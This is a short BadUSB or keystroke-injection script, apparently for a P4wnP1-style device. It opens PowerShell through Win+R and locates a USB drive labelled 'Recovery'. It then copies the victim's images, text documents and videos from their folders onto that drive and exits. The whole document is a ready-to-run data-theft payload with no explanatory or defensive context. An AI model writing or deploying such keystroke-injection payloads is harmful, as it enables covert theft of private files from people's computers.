typingSpeed(20,50)
delay(10000)
layout('us') //set layout us
 
press("GUI r") // windows + r
delay(500)
type("powershell\n") // write powershell and press "enter"
delay(1000)
 
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'Recovery' } | select name\n")
 
var filetypes = ["jpg", "png", "txt", "rtf", "mov", "mp4"]
 
for (var i = 0; i < filetypes.length; i++) {
    type("copy */*." + filetypes[i] + " $usbpath.name\n")
}
type("exit\n")  //exit